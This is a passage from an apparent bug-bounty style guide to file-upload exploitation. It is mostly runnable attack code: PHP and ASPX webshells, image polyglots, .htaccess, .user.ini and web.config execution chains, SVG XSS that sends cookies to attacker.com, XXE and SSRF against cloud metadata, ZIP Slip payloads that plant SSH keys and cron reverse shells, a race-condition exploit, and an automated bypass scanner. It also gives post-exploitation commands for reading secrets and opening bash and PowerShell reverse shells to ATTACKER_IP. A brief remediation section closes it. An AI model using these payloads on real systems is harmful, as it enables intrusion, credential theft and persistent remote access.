      gif += b'\x21\xfe' + bytes([len(payload)]) + payload + b'\x00'
      gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
      with open(output, 'wb') as f:
          f.write(bytes(gif))
      print(f"[+] {output} — Valid GIF + PHP")

  shells = {
      'system': '<?php system($_GET["cmd"]); ?>',
      'eval': '<?php eval($_POST["e"]); ?>',
      'minimal': '<?=`$_GET[c]`?>',
  }

  os.makedirs('polyglots', exist_ok=True)
  for name, code in shells.items():
      jpeg_php(f'polyglots/jpg_{name}.php.jpg', code)
      gif_php(f'polyglots/gif_{name}.gif', code)
      jpeg_php(f'polyglots/jpg_{name}.phtml', code)
  ```
  :::

  :::tabs-item{icon="i-lucide-wand" label="Combined: Magic + Alt Ext + Spoofed CT"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  SHELL='<?php system($_GET["cmd"]); ?>'

  # Maximum bypass: magic bytes + alternative extension + image Content-Type
  for ext in phtml php5 pht phar pgif inc php.jpg jpg.php; do
      printf '\xFF\xD8\xFF\xE0'"${SHELL}" > "/tmp/combo_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/combo_${ext};filename=avatar.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] JPEG magic + .${ext} + CT:image/jpeg ← BYPASS"

      echo -n "GIF89a${SHELL}" > "/tmp/combo_gif_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/combo_gif_${ext};filename=avatar.${ext};type=image/gif" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] GIF magic + .${ext} + CT:image/gif ← BYPASS"
  done

  rm -f /tmp/combo_*
  ```
  :::
::

### Configuration File Upload Chains

When direct code upload fails, uploading server configuration files enables a two-stage attack.

::accordion
  :::accordion-item{icon="i-lucide-file-cog" label="Apache .htaccess Chain"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # ── Stage 1: Upload .htaccess ──
  echo 'AddType application/x-httpd-php .jpg .png .gif .txt' > .htaccess
  curl -X POST "$UPLOAD_URL" -F "file=@.htaccess;filename=.htaccess;type=text/plain" -H "Cookie: $COOKIE"

  # Alternative: Self-executing .htaccess (single file RCE!)
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file .htaccess
  #<?php system($_GET['cmd']); die(); ?>
  EOF
  curl -X POST "$UPLOAD_URL" -F "file=@.htaccess;filename=.htaccess;type=text/plain" -H "Cookie: $COOKIE"

  # ── Stage 2: Upload webshell with image extension ──
  printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -X POST "$UPLOAD_URL" -F "file=@shell.jpg;type=image/jpeg" -H "Cookie: $COOKIE"

  # ── Stage 3: Execute ──
  curl -s "https://target.com/uploads/shell.jpg?cmd=id"
  # For self-exec .htaccess: access any .php file in the directory
  curl -s "https://target.com/uploads/anything.php?cmd=id"
  ```
  :::

  :::accordion-item{icon="i-lucide-file-cog" label="PHP-FPM .user.ini Chain"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # Stage 1: Upload .user.ini
  echo 'auto_prepend_file=shell.jpg' > .user.ini
  curl -X POST "$UPLOAD_URL" -F "file=@.user.ini;filename=.user.ini;type=text/plain" -H "Cookie: $COOKIE"

  # Stage 2: Upload shell as image
  echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -X POST "$UPLOAD_URL" -F "file=@shell.jpg;type=image/jpeg" -H "Cookie: $COOKIE"

  # Stage 3: Wait for cache (default 5 min), access any .php in directory
  sleep 10
  curl -s "https://target.com/uploads/index.php?cmd=id"
  # If no .php exists, upload one
  echo '<?php ?>' | curl -X POST "$UPLOAD_URL" -F "file=@-;filename=info.php;type=text/plain" -H "Cookie: $COOKIE"
  curl -s "https://target.com/uploads/info.php?cmd=id"
  ```
  :::

  :::accordion-item{icon="i-lucide-file-cog" label="IIS web.config Chain"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # Stage 1: web.config mapping .jpg to ASP.NET handler
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="aspx_img" path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
      </handlers>
    </system.webServer>
  </configuration>
  EOF
  curl -X POST "$UPLOAD_URL" -F "file=@web.config;filename=web.config;type=text/xml" -H "Cookie: $COOKIE"

  # Stage 2: ASPX shell as .jpg
  echo '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());%>' > shell.jpg
  curl -X POST "$UPLOAD_URL" -F "file=@shell.jpg;type=image/jpeg" -H "Cookie: $COOKIE"

  # Stage 3: Execute
  curl -s "https://target.com/uploads/shell.jpg?cmd=whoami"
  ```
  :::
::

### Client-Side Validation Bypass

Client-side validation (JavaScript, HTML `accept` attribute) provides **zero security**. Bypass it by not using a browser.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Direct cURL (Bypass ALL JS)"}
  ```bash
  # cURL sends raw HTTP — no JavaScript runs = no client-side validation
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  echo '<?php system($_GET["cmd"]); ?>' > shell.php

  # Direct upload — bypasses ALL client-side checks
  curl -X POST "$UPLOAD_URL" \
    -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
    -H "Cookie: $COOKIE" -v

  # With request headers matching the browser exactly
  curl -X POST "$UPLOAD_URL" \
    -H 'Accept: application/json' \
    -H 'X-Requested-With: XMLHttpRequest' \
    -H "Cookie: $COOKIE" \
    -H 'Origin: https://target.com' \
    -H 'Referer: https://target.com/profile' \
    -F "file=@shell.php;filename=shell.php;type=image/jpeg"
  ```
  :::

  :::tabs-item{icon="i-lucide-monitor" label="Browser Console Methods"}
  ```javascript
  // Execute in F12 Console BEFORE uploading

  // Remove accept attribute restrictions
  document.querySelectorAll('input[type="file"]').forEach(i => {
      i.removeAttribute('accept');
      i.setAttribute('accept', '*/*');
  });

  // Disable form validation
  document.querySelectorAll('form').forEach(f => {
      f.onsubmit = null;
      f.removeAttribute('onsubmit');
  });

  // Override library validators
  if (typeof Dropzone !== 'undefined')
      Dropzone.prototype.accept = function(file, done) { done(); };

  // Upload via Fetch API (bypasses UI validation)
  fetch('/api/upload', {
      method: 'POST',
      body: (() => {
          let fd = new FormData();
          fd.append('file', new File(
              ['<?php system($_GET["cmd"]); ?>'],
              'shell.php', {type: 'image/jpeg'}
          ));
          return fd;
      })(),
      credentials: 'include'
  }).then(r => r.text()).then(console.log);
  ```
  :::
::

---

## Phase 4 — SVG, XSS & Content Sniffing Vectors

When RCE via code upload fails, pivot to client-side attacks through SVG XSS, content sniffing, and HTML injection.

### SVG Attack Payloads

::code-group
```bash [SVG XSS Payloads]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"

# Script tag XSS
cat > xss_script.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <script>alert('XSS:'+document.domain);fetch('https://attacker.com/steal?c='+document.cookie)</script>
  <rect width="200" height="200" fill="red"/>
</svg>
EOF

# Onload event
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle cx="50" cy="50" r="40" fill="blue"/></svg>' > xss_onload.svg

# ForeignObject (embeds full HTML)
cat > xss_foreign.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="400" height="400">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>fetch('https://attacker.com/xss?c='+document.cookie)</script>
    </body>
  </foreignObject>
</svg>
EOF

# Animate bypass (evades script tag filters)
echo '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/></svg>' > xss_animate.svg

# Upload all
for f in xss_*.svg; do
    curl -s -o /dev/null -w "[%{http_code}] ${f}\n" -X POST "$UPLOAD_URL" \
      -F "file=@${f};type=image/svg+xml" -H "Cookie: $COOKIE"
done
```

```bash [SVG SSRF / XXE]
# SVG XXE — read local files (server-side processing triggers it)
cat > xxe.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF

# SVG SSRF — AWS metadata
cat > ssrf_aws.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF

# SVG OOB exfiltration
cat > xxe_oob.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/xxe.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&send;</text></svg>
EOF

UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"

for f in xxe.svg ssrf_aws.svg xxe_oob.svg; do
    curl -s -o /dev/null -w "[%{http_code}] ${f}\n" -X POST "$UPLOAD_URL" \
      -F "file=@${f};type=image/svg+xml" -H "Cookie: $COOKIE"
done
```

```bash [Content Sniffing XSS]
# Upload HTML as image — works when X-Content-Type-Options: nosniff is missing

# Check if nosniff is absent
curl -sI "https://target.com/uploads/" | grep -i x-content-type-options
# If missing → content sniffing XSS is viable

# Pure HTML as .jpg
echo '<script>alert("Content Sniffing XSS: "+document.domain)</script>' > sniff.jpg

curl -X POST "https://target.com/api/upload" \
  -F "file=@sniff.jpg;filename=photo.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"

# GIF+HTML polyglot (passes magic byte check AND sniffs as HTML)
printf 'GIF89a<html><script>alert(document.domain)</script></html>' > sniff_poly.gif

curl -X POST "https://target.com/api/upload" \
  -F "file=@sniff_poly.gif;filename=avatar.gif;type=image/gif" \
  -H "Cookie: session=TOKEN"

# Open the uploaded file URL directly in browser to verify XSS
```
::

---

## Phase 5 — Path Traversal & Race Conditions

### Filename Path Traversal

::tabs
  :::tabs-item{icon="i-lucide-folder-tree" label="Traversal in Filename"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  SHELL='<?php system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/traversal.txt

  for name in \
      "../shell.php" "../../shell.php" "../../../shell.php" \
      "../../../../var/www/html/shell.php" \
      "..%2fshell.php" "..%252fshell.php" \
      "..%5cshell.php" "..\\shell.php" \
      "....//shell.php" "....//....//shell.php" \
      "./../../../shell.php" "uploads/../../shell.php"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/traversal.txt;filename=${name}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  # Check if shell landed in web root
  for p in shell.php ../shell.php; do
      RESULT=$(curl -s "https://target.com/${p}?cmd=id" 2>/dev/null)
      echo "$RESULT" | grep -q "uid=" && echo "[!!!] RCE at: https://target.com/${p}"
  done

  rm -f /tmp/traversal.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-folder-tree" label="ZIP Slip (Archive Path Traversal)"}
  ```python [zipslip.py]
  #!/usr/bin/env python3
  import zipfile

  def create_zipslip(output, path, content):
      with zipfile.ZipFile(output, 'w') as zf:
          zf.writestr("readme.txt", "Normal file")
          zf.writestr(path, content)
      print(f"[+] {output}: {path}")

  shell = '<?php system($_GET["cmd"]); ?>'

  create_zipslip("zipslip.zip", "../../../var/www/html/shell.php", shell)
  create_zipslip("zipslip_ssh.zip", "../../../../../root/.ssh/authorized_keys",
      "ssh-rsa AAAAB3... attacker@kali")
  create_zipslip("zipslip_cron.zip", "../../../etc/cron.d/revshell",
      "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n")
  ```
  :::
::

### Race Condition Exploitation

::code-collapse
```python [race_condition_exploit.py]
#!/usr/bin/env python3
"""
Race condition: upload shell and access it before server validates/deletes it.
The window between write and validation is typically 10-500ms.
"""
import requests
import threading
import time
import urllib3
urllib3.disable_warnings()

class UploadRace:
    def __init__(self, upload_url, shell_url, cookie=None):
        self.upload_url = upload_url
        self.shell_url = shell_url
        self.session = requests.Session()
        self.session.verify = False
        if cookie:
            self.session.cookies.update(cookie)
        self.won = False

    def upload_loop(self, filename, content, count=200):
        for _ in range(count):
            if self.won: break
            try:
                self.session.post(self.upload_url,
                    files={'file': (filename, content, 'image/jpeg')}, timeout=5)
            except: pass

    def access_loop(self, duration=15):
        end = time.time() + duration
        while time.time() < end and not self.won:
            try:
                r = self.session.get(self.shell_url,
                    params={'cmd': 'echo RACE_WON'}, timeout=2)
                if 'RACE_WON' in r.text:
                    self.won = True
                    print(f"\n[!!!] RACE WON — {self.shell_url}")
                    return True
            except: pass
        return False

    def exploit(self):
        shell = b'<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>'
        for fn in ['shell.php', 'shell.phtml', 'shell.php5', 'shell.php.jpg']:
            if self.won: break
            print(f"[*] Racing with {fn}...")
            t1 = threading.Thread(target=self.upload_loop, args=(fn, shell))
            t2 = threading.Thread(target=self.access_loop)
            t1.start(); t2.start()
            t1.join(); t2.join()
        if not self.won:
            print("[-] Race not exploitable in this run")

if __name__ == "__main__":
    UploadRace(
        upload_url="https://target.com/api/upload",
        shell_url="https://target.com/uploads/shell.php",
        cookie={"session": "AUTH_TOKEN"}
    ).exploit()
```
::

---

## Phase 6 — Comprehensive Automated Scanner

This scanner combines all bypass techniques into a single tool.

::code-collapse
```python [upload_bypass_scanner.py]
#!/usr/bin/env python3
"""
Complete File Upload Bypass Scanner — 300+ test cases
"""
import requests, itertools, time, json, os, struct
import urllib3
urllib3.disable_warnings()

class UploadScanner:
    PHP_EXTS = ['php','phtml','php5','php7','php4','php3','php8',
                'pht','phps','phar','pgif','phtm','phpt','inc','module']
    ASP_EXTS = ['asp','aspx','ashx','asmx','asa','cer','cdx','cshtml','config']
    JSP_EXTS = ['jsp','jspx','jsw','jsv','jspf']
    CONFIG = ['.htaccess','.user.ini','web.config']
    XSS_EXTS = ['svg','html','htm','xhtml','xml','hta']

    SHELLS = {
        'php': b'<?php echo "BYPASS_MARKER"; system($_GET["cmd"]); ?>',
        'asp': b'<%eval request("cmd")%>',
        'aspx': b'<%@ Page Language="C#" %><%Response.Write("BYPASS_MARKER");%>',
        'jsp': b'<%out.println("BYPASS_MARKER");%>',
        'ssi': b'<!--#exec cmd="echo BYPASS_MARKER"-->',
        'xss': b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>',
        'htaccess': b'AddType application/x-httpd-php .jpg .png .gif .txt',
        'userini': b'auto_prepend_file=shell.jpg',
        'webconfig': b'<?xml version="1.0"?><configuration><system.webServer><handlers><add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/></handlers></system.webServer></configuration>',
    }

    MAGIC = {
        'jpeg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
        'png': b'\x89PNG\r\n\x1a\n',
        'gif': b'GIF89a',
        'bmp': b'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00',
    }

    def __init__(self, upload_url, field="file", cookies=None, headers=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 20
        if cookies: self.session.cookies.update(cookies)
        if headers: self.session.headers.update(headers)
        self.results = {'accepted': [], 'total': 0}

    def get_shell(self, ext):
        el = ext.lower().rstrip('. \t')
        if el in ['asp','asa','cer','cdx']: return self.SHELLS['asp']
        if el in ['aspx','ashx','asmx','cshtml']: return self.SHELLS['aspx']
        if el in ['jsp','jspx','jsw','jsv','jspf']: return self.SHELLS['jsp']
        if el in ['shtml','stm','shtm']: return self.SHELLS['ssi']
        if el in ['svg','html','htm','xhtml','xml','hta']: return self.SHELLS['xss']
        if 'htaccess' in el: return self.SHELLS['htaccess']
        if 'user.ini' in el: return self.SHELLS['userini']
        if 'config' in el and 'web' in el: return self.SHELLS['webconfig']
        return self.SHELLS['php']

    def upload(self, content, filename, ct='application/octet-stream'):
        files = {self.field: (filename, content, ct)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=20)
            ok = r.status_code in [200,201] and any(
                w in r.text.lower() for w in ['success','upload','saved','url','path','file','created']
            ) and not any(
                w in r.text.lower() for w in ['error','invalid','denied','blocked','forbidden','not allowed']
            )
            return ok, r.status_code
        except: return False, 0

    def case_perms(self, ext, limit=8):
        chars = [[c.lower(),c.upper()] if c.isalpha() else [c] for c in ext]
        return list(dict.fromkeys(''.join(p) for p in itertools.product(*chars)))[:limit]

    def scan(self, delay=0.2):
        tests = []

        # Direct extensions
        for ext in self.PHP_EXTS + self.ASP_EXTS + self.JSP_EXTS + ['shtml','stm','cgi','pl','py']:
            tests.append(('direct', f'shell.{ext}', ext, None))

        # Case variations
        for ext in ['php','phtml','php5','asp','aspx','jsp']:
            for case in self.case_perms(ext):
                if case != ext: tests.append(('case', f'shell.{case}', ext, None))

        # Double extensions
        for exec_ext in ['php','phtml','php5','asp','aspx','jsp']:
            for safe in ['jpg','png','gif','txt']:
                tests.append(('dbl1', f'shell.{exec_ext}.{safe}', exec_ext, None))
                tests.append(('dbl2', f'shell.{safe}.{exec_ext}', exec_ext, None))

        # Trailing characters
        for ext in ['php','aspx','jsp']:
            for trail in ['.','..','%20','%00','%09']:
                tests.append(('trail', f'shell.{ext}{trail}', ext, None))

        # NTFS/IIS tricks
        for ext in ['aspx','asp','php']:
            tests.append(('ntfs', f'shell.{ext}::$DATA', ext, None))
            tests.append(('semi', f'shell.{ext};.jpg', ext, None))

        # Null byte
        for ext in ['php','phtml','aspx']:
            tests.append(('null', f'shell.{ext}%00.jpg', ext, None))

        # Magic bytes + alt ext
        for ext in ['phtml','php5','pht','phar']:
            for mn, mb in self.MAGIC.items():
                tests.append(('magic', f'shell.{ext}', ext, mb))

        # Config files
        for cfg in self.CONFIG:
            tests.append(('config', cfg, cfg.lstrip('.'), None))

        # XSS vectors
        for ext in self.XSS_EXTS:
            tests.append(('xss', f'test.{ext}', ext, None))

        print(f"\n{'='*60}")
        print(f" Upload Bypass Scanner — {len(tests)} test cases")
        print(f"{'='*60}")
        print(f"[*] Target: {self.upload_url}\n")

        for i, (cat, filename, base_ext, magic) in enumerate(tests):
            self.results['total'] += 1
            shell = self.get_shell(base_ext)
            content = (magic + shell) if magic else shell
            ct = 'image/jpeg' if any(filename.endswith(e) for e in ['.jpg','.png','.gif']) else 'application/octet-stream'

            ok, status = self.upload(content, filename, ct)
            if ok:
                self.results['accepted'].append({'cat': cat, 'file': filename, 'ext': base_ext, 'status': status})
                print(f"[+] [{cat:8s}] {filename}")

            if (i+1) % 50 == 0: print(f"[*] Progress: {i+1}/{len(tests)}")
            time.sleep(delay)

        print(f"\n{'='*60}")
        print(f" RESULTS: {len(self.results['accepted'])}/{self.results['total']} accepted")
        print(f"{'='*60}")
        if self.results['accepted']:
            cats = {}
            for r in self.results['accepted']:
                cats.setdefault(r['cat'], []).append(r)
            for cat, items in cats.items():
                print(f"\n  [{cat}]:")
                for item in items[:15]:
                    print(f"    {item['file']}")
        return self.results

if __name__ == "__main__":
    UploadScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    ).scan(delay=0.3)
```
::

---

## Phase 7 — Verification & Post-Exploitation

### Shell Verification

::code-group
```bash [Find & Verify Uploaded Shell]
TARGET="https://target.com"
FILENAME="shell.phtml"  # whatever was accepted

# Brute force upload directories
for dir in uploads upload files media images static assets content \
           data tmp temp public storage user-content Uploads Files; do
    for f in "$FILENAME" "shell.php" "shell.php5" "shell.pht" "shell.php.jpg" "avatar.jpg"; do
        URL="${TARGET}/${dir}/${f}"
        RESULT=$(curl -s --max-time 3 "${URL}?cmd=echo+UPLOAD_RCE_VERIFIED" 2>/dev/null)
        if echo "$RESULT" | grep -q "UPLOAD_RCE_VERIFIED"; then
            echo "[!!!] RCE CONFIRMED: ${URL}"
            curl -s "${URL}?cmd=id;hostname;uname+-a"
            exit 0
        fi
    done
done
echo "[-] Shell not found — check upload response for exact path"
```

```bash [OOB Verification]
COLLAB="YOUR_COLLAB_ID.oastify.com"

# PHP OOB callback
printf '\xFF\xD8\xFF\xE0<?php file_get_contents("http://'$COLLAB'/upload_rce"); ?>' > oob.phtml

curl -X POST "https://target.com/api/upload" \
  -F "file=@oob.phtml;type=image/jpeg" -H "Cookie: session=TOKEN"

# Access it to trigger
curl -s "https://target.com/uploads/oob.phtml" &>/dev/null

echo "[*] Check Burp Collaborator for 'upload_rce' callback"
```

```bash [Time-Based Verification]
# Upload shell with sleep()
echo '<?php if(isset($_GET["s"])){sleep((int)$_GET["s"]);echo "SLEPT";} ?>' > time_shell.phtml

curl -X POST "https://target.com/api/upload" \
  -F "file=@time_shell.phtml;type=image/jpeg" -H "Cookie: session=TOKEN"

# Measure response time
TIME_FAST=$(curl -s -o /dev/null -w "%{time_total}" "https://target.com/uploads/time_shell.phtml?s=0")
TIME_SLOW=$(curl -s -o /dev/null -w "%{time_total}" "https://target.com/uploads/time_shell.phtml?s=5")

echo "Fast: ${TIME_FAST}s | Slow: ${TIME_SLOW}s"
# If difference is ~5s → PHP executed
```
::

### Post-Exploitation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux Post-Exploitation"}
  ```bash
  SHELL="https://target.com/uploads/shell.phtml"

  # System info
  curl -s "$SHELL?cmd=id;hostname;uname+-a;cat+/etc/os-release"

  # Sensitive files
  curl -s "$SHELL" --data-urlencode "cmd=cat /etc/passwd | head -10"
  curl -s "$SHELL" --data-urlencode "cmd=find / -name '.env' -o -name 'config.php' -o -name 'wp-config.php' -o -name 'database.yml' 2>/dev/null | head -20"
  curl -s "$SHELL" --data-urlencode "cmd=cat /var/www/html/.env 2>/dev/null"
  curl -s "$SHELL" --data-urlencode "cmd=env | grep -iE 'key|secret|pass|token|database'"

  # Network
  curl -s "$SHELL" --data-urlencode "cmd=ip addr; echo '---'; ss -tlnp; echo '---'; cat /etc/hosts"

  # Reverse shell
  curl -s "$SHELL" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Windows Post-Exploitation"}
  ```bash
  SHELL="https://target.com/uploads/shell.aspx"

  curl -s "$SHELL?cmd=whoami+/all"
  curl -s "$SHELL" --data-urlencode "cmd=systeminfo"
  curl -s "$SHELL" --data-urlencode "cmd=ipconfig /all"
  curl -s "$SHELL" --data-urlencode "cmd=net user"
  curl -s "$SHELL" --data-urlencode "cmd=net localgroup administrators"
  curl -s "$SHELL" --data-urlencode "cmd=type C:\\inetpub\\wwwroot\\web.config"
  curl -s "$SHELL" --data-urlencode "cmd=findstr /si password *.config *.xml *.json"

  # PowerShell reverse shell
  curl -s "$SHELL" --data-urlencode \
    "cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=[text.encoding]::ASCII.GetBytes(\$r+'PS> ');\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()\""
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Safe PoC for Reports"}
  ```bash
  TIMESTAMP=$(date +%s)

  cat > poc.php << POCEOF
  <?php
  echo "UPLOAD_RCE_POC_${TIMESTAMP}\n";
  echo "Server: " . php_uname() . "\n";
  echo "PHP: " . phpversion() . "\n";
  echo "User: " . get_current_user() . "\n";
  echo "Path: " . __DIR__ . "\n";
  echo "Time: " . date('Y-m-d H:i:s') . "\n";
  ?>
  POCEOF

  curl -X POST "https://target.com/api/upload" \
    -F "file=@poc.php;filename=poc_${TIMESTAMP}.phtml;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  curl -s "https://target.com/uploads/poc_${TIMESTAMP}.phtml"

  echo "═══ Report ═══"
  echo "Title: Remote Code Execution via File Upload Extension Bypass"
  echo "Severity: Critical (CVSS 9.8)"
  echo "Bypass: .phtml extension not blocked by blacklist"
  echo "PoC ID: ${TIMESTAMP}"
  ```
  :::
::

---

## Reporting Methodology

### Report Structure

::steps{level="4"}

#### Title
`Remote Code Execution via [Specific Bypass] in File Upload at [Endpoint]`

#### Root Cause
Describe the exact validation gap. Is it a blacklist missing `.phtml`? Case-sensitive comparison? Missing server-side validation? Include the CWE reference (CWE-434, CWE-183, CWE-178, CWE-602).

#### Reproduction Steps
Provide the exact cURL command that reproduces the issue. Include every header, cookie, and parameter value.

```bash
# Step 1: Create webshell
echo '<?php echo "POC_" . php_uname(); ?>' > poc.phtml

# Step 2: Upload with bypass
curl -X POST "https://target.com/api/upload" \
  -F "file=@poc.phtml;filename=poc.phtml;type=image/jpeg" \
  -H "Cookie: session=AUTH_TOKEN_HERE"

# Step 3: Verify execution
curl "https://target.com/uploads/poc.phtml"
# Output: POC_Linux target 5.4.0-42-generic x86_64
```

#### Impact
An attacker can execute arbitrary commands as the web server user, read sensitive configuration files, pivot to internal networks, and establish persistent access.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Whitelist Extensions
  ---
  Allow only specific, known-safe extensions (`.jpg`, `.png`, `.gif`, `.pdf`). Use case-insensitive comparison. **Never use blacklists** — they inevitably miss extensions.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Random Filenames
  ---
  Generate filenames server-side: `bin2hex(random_bytes(16)) . '.jpg'`. This eliminates all extension tricks, path traversal, and config file uploads in one step.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Validate Content
  ---
  Check actual file content with server-side libraries. Use `getimagesize()` (PHP), `python-magic` (Python), or `ImageIO` (Java). Never trust the `Content-Type` header.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Re-encode Images
  ---
  Process uploads through an image library and save a new copy. This strips embedded code from EXIF, comments, and pixel data.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Store Outside Web Root
  ---
  Save uploads in a non-web-accessible directory. Serve through a proxy with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable Execution
  ---
  Configure the web server to never execute scripts in the upload directory. Apache: `php_flag engine off`. Nginx: don't proxy to PHP-FPM. IIS: remove script handlers. Block `.htaccess`, `.user.ini`, and `web.config` uploads.
  :::
::